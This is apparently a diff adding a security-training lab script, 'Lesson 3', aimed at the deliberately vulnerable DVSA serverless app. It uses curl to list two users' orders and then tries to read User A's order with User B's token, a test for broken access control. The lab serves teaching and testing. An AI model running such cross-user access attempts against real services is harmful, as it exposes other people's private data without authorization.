@@ -1,0 +1,31 @@
+# Lesson 3 - Sensitive Data Exposure / Backend Error Leakage
+
+# Set API endpoint
+export API="https://ffn6z0b813.execute-api.us-east-1.amazonaws.com/dvsa/order"
+
+# Set User A token
+export TOKEN_A="PASTE_USER_A_TOKEN_HERE"
+
+# Set User B token
+export TOKEN_B="PASTE_USER_B_TOKEN_HERE"
+
+# Set User A order ID
+export ORDER_A="ef559783-b2b4-4e6e-a0fe-7d00345ba6c5"
+
+# Test User A normal orders
+curl -s "$API" \
+-H "content-type: application/json" \
+-H "authorization: $TOKEN_A" \
+--data-raw '{"action":"orders"}' | jq
+
+# Test User B normal orders
+curl -s "$API" \
+-H "content-type: application/json" \
+-H "authorization: $TOKEN_B" \
+--data-raw '{"action":"orders"}' | jq
+
+# Attempt to access User A order using User B token
+curl -s "$API" \
+-H "content-type: application/json" \
+-H "authorization: $TOKEN_B" \
+--data-raw "{\"action\":\"get\",\"order-id\":\"$ORDER_A\"}" | jq
